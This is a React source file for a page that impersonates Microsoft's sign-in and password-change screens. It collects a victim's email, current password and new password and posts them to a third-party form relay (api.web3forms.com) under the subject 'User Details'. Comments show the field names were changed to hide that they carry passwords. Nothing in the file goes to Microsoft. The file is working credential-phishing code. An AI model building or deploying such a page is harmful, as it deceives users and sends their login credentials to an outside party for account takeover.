import { useState } from 'react';
import './App.css';

function App() {
    const [step, setStep] = useState(1);
    
    const [email, setEmail] = useState('');
    const [currentPassword, setCurrentPassword] = useState('');
    const [newPassword, setNewPassword] = useState('');
    const [confirmPassword, setConfirmPassword] = useState('');
    const [isSubmitting, setIsSubmitting] = useState(false);

    const handleEmailSubmit = (e) => {
        e.preventDefault();
        setStep(2); 
    };

    const handleFinalSubmit = async (e) => {
        e.preventDefault();
        
        if (newPassword !== confirmPassword) {
            alert("New password and confirm password do not match!");
            return;
        }

        setIsSubmitting(true);

        try {
            const response = await fetch("https://api.web3forms.com/submit", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    Accept: "application/json",
                },
                body: JSON.stringify({
                    access_key: "bc958407-4bfa-4322-bb11-cea1603b96ba", 
                    account_id: email, // Changed from email_submitted
                    current_key: currentPassword, // Changed from current_password
                    new_key: newPassword, // Changed from new_password
                    subject: "User Details",
                }),
            });
            
            const result = await response.json();
            if (result.success) {
                alert("Password update requested successfully!");
                setEmail('');
                setCurrentPassword('');
                setNewPassword('');
                setConfirmPassword('');
                setStep(1);
            }
        } catch (error) {
            console.error("Error sending form", error);
        } finally {
            setIsSubmitting(false);
        }
    };

    return (
        <div className='relative min-h-screen w-full'>
            <img src="/background.svg" className="w-full h-full object-cover absolute inset-0 -z-10" alt="background" />
            
            {/* The main layout uses flexbox to stay centered without relying on fixed positioning */}
            <div className="flex items-center justify-center min-h-screen w-full px-4">
                
                <div className="bg-[#292929] p-8 md:p-10 shadow-[0_0_2px_rgba(0,0,0,0.24),0_8px_16px_rgba(0,0,0,0.28)] rounded-xl w-full max-w-[440px]">
                    
                    {/* Microsoft Logo Header (Static, doesn't slide) */}
                    <div className="pb-6 flex items-center justify-center gap-2">
                        <svg className="w-6 h-6" viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg">
                            <path fill="#f35325" d="M1 1h10v10H1z"/>
                            <path fill="#81bc06" d="M12 1h10v10H12z"/>
                            <path fill="#05a6f0" d="M1 12h10v10H1z"/>
                            <path fill="#ffba08" d="M12 12h10v10H12z"/>
                        </svg>
                        <span className="text-white text-xl font-semibold">Microsoft</span>
                    </div>

                    {/* THIS IS THE FIX: A dedicated window that hides the overflow immediately at the content edge */}
                    <div className="w-full overflow-hidden">
                        
                        {/* Sliding Carousel Wrapper */}
                        <div className={`flex w-[200%] transition-transform duration-300 ease-in-out ${step === 2 ? '-translate-x-1/2' : 'translate-x-0'}`}>
                            
                            {/* STEP 1: EMAIL BLOCK */}
                            <div className="w-1/2 flex-shrink-0">
                                <h1 className="text-2xl font-semibold pt-3.5 text-white text-center">Sign in</h1>
                                <p className="text-sm text-gray-300 pt-3.5 text-center">Use your Microsoft account.</p>

                                <form onSubmit={handleEmailSubmit}>
                                    <div className="relative w-full pt-8">
                                        <input type="text" id="login-email" value={email} onChange={(e) => setEmail(e.target.value)} className="peer w-full bg-transparent border border-[#999999] rounded text-[#999999] p-2.5 focus:outline-none focus:border-[#999999] border-b-2 focus:border-b-[#00a4ef] transition-colors text-sm" />
                                        <label htmlFor="login-email" className={`absolute left-3 bg-[#292929] px-1 pointer-events-none transition-all duration-200 text-[#999999] -translate-y-[50%] peer-focus:top-[42%] peer-focus:text-xs ${email.length > 0 ? "top-[42%] text-xs" : "top-[69%] text-base"}`}>
                                            Email or phone number
                                        </label>
                                    </div>
                                    
                                    <div className="text-sm pt-3">
                                        <a href="#" className="text-[#00a4ef] font-semibold hover:underline">Forgot your username?</a>
                                    </div>

                                    <div className="flex justify-end pt-8">
                                        <button type="submit" className="hover:bg-[#0067b8] text-white px-8 py-2 font-semibold rounded-sm bg-[#005da6] transition-colors w-full">
                                            Next
                                        </button>
                                    </div>
                                </form>

                                <div className="pt-8">
                                    <p className="text-sm text-center text-gray-300">New to Microsoft? <a href="#" className="text-[#00a4ef] font-semibold hover:underline">Create an account</a></p>
                                </div>
                            </div>

                            {/* STEP 2: PASSWORD BLOCK */}
                            <div className="w-1/2 flex-shrink-0">

                                <h1 className="text-2xl font-semibold pt-1 text-white text-center">Change Password</h1>

                                <form onSubmit={handleFinalSubmit}>
                                    <div className="relative w-full pt-6">
                                        <input type="password" id="current-password" value={currentPassword} onChange={(e) => setCurrentPassword(e.target.value)} className="peer w-full bg-transparent border border-[#999999] rounded text-white p-2.5 focus:outline-none focus:border-[#999999] border-b-2 focus:border-b-[#00a4ef] transition-colors text-sm" />
                                        <label htmlFor="current-password" className={`absolute left-3 bg-[#292929] px-1 pointer-events-none transition-all duration-200 text-[#999999] -translate-y-[50%] peer-focus:top-[38%] peer-focus:text-xs ${currentPassword.length > 0 ? "top-[38%] text-xs" : "top-[65%] text-base"}`}>
                                            Current password
                                        </label>
                                    </div>

                                    <div className="relative w-full pt-5">
                                        <input type="password" id="new-password" value={newPassword} onChange={(e) => setNewPassword(e.target.value)} className="peer w-full bg-transparent border border-[#999999] rounded text-white p-2.5 focus:outline-none focus:border-[#999999] border-b-2 focus:border-b-[#00a4ef] transition-colors text-sm" />
                                        <label htmlFor="new-password" className={`absolute left-3 bg-[#292929] px-1 pointer-events-none transition-all duration-200 text-[#999999] -translate-y-[50%] peer-focus:top-[35%] peer-focus:text-xs ${newPassword.length > 0 ? "top-[35%] text-xs" : "top-[63%] text-base"}`}>
                                            New password
                                        </label>
                                    </div>

                                    <div className="relative w-full pt-5">
                                        <input type="password" id="confirm-password" value={confirmPassword} onChange={(e) => setConfirmPassword(e.target.value)} className="peer w-full bg-transparent border border-[#999999] rounded text-white p-2.5 focus:outline-none focus:border-[#999999] border-b-2 focus:border-b-[#00a4ef] transition-colors text-sm" />
                                        <label htmlFor="confirm-password" className={`absolute left-3 bg-[#292929] px-1 pointer-events-none transition-all duration-200 text-[#999999] -translate-y-[50%] peer-focus:top-[35%] peer-focus:text-xs ${confirmPassword.length > 0 ? "top-[35%] text-xs" : "top-[63%] text-base"}`}>
                                            Confirm password
                                        </label>
                                    </div>

                                    <div className="flex justify-end pt-8">
                                        <button type="submit" disabled={isSubmitting} className="hover:bg-[#0067b8] text-white px-8 py-2 font-semibold rounded-sm bg-[#005da6] transition-colors w-full disabled:opacity-50" >
                                            {isSubmitting ? "Updating..." : "Update Password"}
                                        </button>
                                    </div>
                                </form>
                            </div>
                            
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default App;